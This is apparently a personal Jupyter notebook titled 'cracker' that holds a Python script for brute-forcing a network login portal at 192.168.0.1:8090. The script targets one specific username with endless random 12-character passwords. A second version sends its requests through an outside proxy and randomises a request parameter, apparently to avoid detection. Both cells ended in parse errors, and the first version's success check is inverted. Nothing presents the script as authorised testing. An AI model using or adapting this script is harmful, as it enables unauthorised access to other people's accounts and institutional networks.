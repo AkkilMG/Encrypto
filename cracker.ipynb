{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting requests\n",
      "  Downloading requests-2.31.0-py3-none-any.whl (62 kB)\n",
      "                                              0.0/62.6 kB ? eta -:--:--\n",
      "     -------------------                      30.7/62.6 kB 1.3 MB/s eta 0:00:01\n",
      "     -------------------------------------- 62.6/62.6 kB 670.9 kB/s eta 0:00:00\n",
      "Collecting charset-normalizer<4,>=2 (from requests)\n",
      "  Downloading charset_normalizer-3.3.2-cp311-cp311-win_amd64.whl (99 kB)\n",
      "                                              0.0/99.9 kB ? eta -:--:--\n",
      "     ----------------------------             71.7/99.9 kB 4.1 MB/s eta 0:00:01\n",
      "     ---------------------------------------- 99.9/99.9 kB 1.9 MB/s eta 0:00:00\n",
      "Collecting idna<4,>=2.5 (from requests)\n",
      "  Downloading idna-3.7-py3-none-any.whl (66 kB)\n",
      "                                              0.0/66.8 kB ? eta -:--:--\n",
      "     ---------------------------------------- 66.8/66.8 kB 3.8 MB/s eta 0:00:00\n",
      "Collecting urllib3<3,>=1.21.1 (from requests)\n",
      "  Downloading urllib3-2.2.1-py3-none-any.whl (121 kB)\n",
      "                                              0.0/121.1 kB ? eta -:--:--\n",
      "     -------------------------------------- 121.1/121.1 kB 6.9 MB/s eta 0:00:00\n",
      "Collecting certifi>=2017.4.17 (from requests)\n",
      "  Downloading certifi-2024.2.2-py3-none-any.whl (163 kB)\n",
      "                                              0.0/163.8 kB ? eta -:--:--\n",
      "     -------------------------------------- 163.8/163.8 kB 9.6 MB/s eta 0:00:00\n",
      "Installing collected packages: urllib3, idna, charset-normalizer, certifi, requests\n",
      "Successfully installed certifi-2024.2.2 charset-normalizer-3.3.2 idna-3.7 requests-2.31.0 urllib3-2.2.1\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "\n",
      "[notice] A new release of pip is available: 23.1.2 -> 24.0\n",
      "[notice] To update, run: python.exe -m pip install --upgrade pip\n"
     ]
    }
   ],
   "source": [
    "%pip install requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "metadata": {},
   "outputs": [
    {
     "ename": "ParseError",
     "evalue": "no element found: line 1, column 0 (<string>)",
     "output_type": "error",
     "traceback": [
      "Traceback \u001b[1;36m(most recent call last)\u001b[0m:\n",
      "\u001b[0m  File \u001b[0;32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\IPython\\core\\interactiveshell.py:3577\u001b[0m in \u001b[0;35mrun_code\u001b[0m\n    exec(code_obj, self.user_global_ns, self.user_ns)\u001b[0m\n",
      "\u001b[0m  Cell \u001b[0;32mIn[23], line 27\u001b[0m\n    for event, elem in events:\u001b[0m\n",
      "\u001b[0m  File \u001b[0;32mc:\\Users\\Sahyadri\\AppData\\Local\\Programs\\Python\\Python311\\Lib\\xml\\etree\\ElementTree.py:1255\u001b[0m in \u001b[0;35miterator\u001b[0m\n    root = pullparser._close_and_return_root()\u001b[0m\n",
      "\u001b[1;36m  File \u001b[1;32mc:\\Users\\Sahyadri\\AppData\\Local\\Programs\\Python\\Python311\\Lib\\xml\\etree\\ElementTree.py:1298\u001b[1;36m in \u001b[1;35m_close_and_return_root\u001b[1;36m\n\u001b[1;33m    root = self._parser.close()\u001b[1;36m\n",
      "\u001b[1;36m  File \u001b[1;32m<string>\u001b[1;36m\u001b[0m\n\u001b[1;31mParseError\u001b[0m\u001b[1;31m:\u001b[0m no element found: line 1, column 0\n"
     ]
    }
   ],
   "source": [
    "import requests, random, string\n",
    "import xml.etree.ElementTree as ET\n",
    "\n",
    "login_url = \"http://192.168.0.1:8090/login.xml\"\n",
    "usernames = [\"4SF19IS104\"]\n",
    "\n",
    "def generate_password():\n",
    "    chars = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)\n",
    "    random.shuffle(chars)\n",
    "    password = ''.join(chars[:12])\n",
    "    return password\n",
    "\n",
    "for username in usernames:\n",
    "    while True:\n",
    "        password = generate_password()\n",
    "        payload = {\n",
    "            \"mode\": \"191\",\n",
    "            \"username\": username,\n",
    "            \"password\": password,\n",
    "            \"a\": \"1716193371662\",\n",
    "            \"producttype\": \"0\",\n",
    "        }\n",
    "        response = requests.post(login_url, data=payload, stream=True)\n",
    "        tree = ET.fromstring(response.content)\n",
    "        response.raw.decode_content = True\n",
    "        events = ET.iterparse(response.raw)\n",
    "        for event, elem in events:\n",
    "            print(event, elem)\n",
    "        if response.status_code == 200 and \"Login failed. Invalid user name/password. Please contact the administrator.\" in str(response.text):\n",
    "            print(response.text)\n",
    "            print(f\"Successful login! Username: {username}, Password: {password}\")\n",
    "            break\n",
    "        else:\n",
    "            print(f\"Failed login attempt: Username: {username}, Password: {password}\")\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "591 6078270724779\n",
      "<Response [502]>\n"
     ]
    },
    {
     "ename": "ParseError",
     "evalue": "syntax error: line 2, column 20 (<string>)",
     "output_type": "error",
     "traceback": [
      "Traceback \u001b[1;36m(most recent call last)\u001b[0m:\n",
      "\u001b[0m  File \u001b[0;32m~\\AppData\\Roaming\\Python\\Python311\\site-packages\\IPython\\core\\interactiveshell.py:3577\u001b[0m in \u001b[0;35mrun_code\u001b[0m\n    exec(code_obj, self.user_global_ns, self.user_ns)\u001b[0m\n",
      "\u001b[0m  Cell \u001b[0;32mIn[19], line 30\u001b[0m\n    root = ET.fromstring(response.text)\u001b[0m\n",
      "\u001b[1;36m  File \u001b[1;32mc:\\Users\\Sahyadri\\AppData\\Local\\Programs\\Python\\Python311\\Lib\\xml\\etree\\ElementTree.py:1338\u001b[1;36m in \u001b[1;35mXML\u001b[1;36m\n\u001b[1;33m    parser.feed(text)\u001b[1;36m\n",
      "\u001b[1;36m  File \u001b[1;32m<string>\u001b[1;36m\u001b[0m\n\u001b[1;31mParseError\u001b[0m\u001b[1;31m:\u001b[0m syntax error: line 2, column 20\n"
     ]
    }
   ],
   "source": [
    "import requests, random, string, time\n",
    "import xml.etree.ElementTree as ET\n",
    "\n",
    "login_url = \"http://192.168.0.1:8090/login.xml\"\n",
    "usernames = [\"4SF19IS104\"]\n",
    "\n",
    "def generate_password():\n",
    "    chars = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)\n",
    "    random.shuffle(chars)\n",
    "    password = ''.join(chars[:12])\n",
    "    return password\n",
    "\n",
    "for username in usernames:\n",
    "    while True:\n",
    "        password = generate_password()\n",
    "        print(str(random.randint(10**2, 10**3 - 1)), str(random.randint(10**12, 10**13 - 1)))\n",
    "        payload = {\n",
    "            \"mode\": \"191\",\n",
    "            \"username\": username,\n",
    "            \"password\": password,\n",
    "            \"a\": str(random.randint(10**12, 10**13 - 1)), #\"1716193371662\",\n",
    "            \"producttype\": \"0\",\n",
    "        }\n",
    "        s= requests.Session()\n",
    "        s.proxies.update()\n",
    "        response = requests.post(login_url, data=payload, proxies={\"http\": \"http://61.233.25.166:80\"})\n",
    "        with open('./file.html', \"w\") as f:\n",
    "            f.write(response.text)\n",
    "        print(response)\n",
    "        root = ET.fromstring(response.text)\n",
    "        # root = tree.getroot()\n",
    "        print(root['requestresponse'])\n",
    "        # print(root[0].attrib)\n",
    "        # print(root[5][0].text)\n",
    "\n",
    "        # # Check if login failed\n",
    "        # if \"Login failed. Invalid user name/password. Please contact the administrator.\" in response.text:\n",
    "        #     print(f\"Failed login attempt: Username: {username}, Password: {password}\")\n",
    "        # else:\n",
    "        #     print(response.text)\n",
    "        #     print(f\"Successful login! Username: {username}, Password: {password}\")\n",
    "        #     break\n",
    "        # time.sleep(2)\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
